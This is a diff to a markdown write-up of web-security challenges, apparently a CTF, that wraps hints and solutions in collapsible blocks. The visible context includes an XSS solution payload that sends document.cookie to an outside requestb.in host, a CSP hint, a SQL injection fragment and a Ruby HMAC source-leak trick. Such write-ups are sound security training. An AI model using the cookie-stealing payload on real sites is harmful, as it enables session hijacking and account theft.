@@ -63,6 +63,7 @@ http://139.59.127.142/39b21eea-6168-431b-81b5-23252749917e/
 
 <details>
 <summary>Solution</summary>
+<p>
 
 js:
 `');}location='http://requestb.in/1bikbhd1?x='+encodeURIComponent(document.cookie);{{'*/'/*`
@@ -70,13 +71,21 @@ js:
 url:
 http://139.59.127.142/39b21eea-6168-431b-81b5-23252749917e/?js=')%3B%7Dlocation%3D'http%3A%2F%2Frequestb.in%2F1bikbhd1%3Fx%3D'%2BencodeURIComponent(document.cookie)%3B%7B%7B'*%2F'%2F*
 
+</p>
 </details>
 
 # 8. xss
 http://139.59.127.141/8e11d478-be5d-4f05-a27b-f3bff7b84168/
 
+<details>
+<summary>Hint</summary>
+<p>
+
 `?url` query parameter is vulnerable to xss. CSP rules are:  
 `Content-Security-Policy:default-src 'none'; script-src 'nonce-disabled';`
+
+</p>
+</details>
 
 <details>
 <summary>Solution</summary>
@@ -150,6 +159,10 @@ union select'success'#
 # 11. ruby hmac token 1
 http://139.59.127.145/db55fc7a-c615-449a-b86e-bde4df2ed70c/
 
+<details>
+<summary>Hint</summary>
+<p>
+
 There is source leak by forcing some ruby error, for example utf8 decoding error. We need to sign a malformed string, but that's not a problem.
 
 http://139.59.127.145/db55fc7a-c615-449a-b86e-bde4df2ed70c/?data=aaaaaaaaa%FFb%20%20%20%20%20%20%20%20%20GUEST%20%20%20%20%20&hmac=ca9a9653f330c29dc8f797c08d6f23a16e17c2132e993b7981a1ad330723b655
@@ -171,6 +184,9 @@ http://139.59.127.145/db55fc7a-c615-449a-b86e-bde4df2ed70c/?data=aaaaaaaaa%FFb%2
     @title = "User Info"
     erb :index
 ```
+
+</p>
+</details>
 
 <details>
 <summary>Solution</summary>
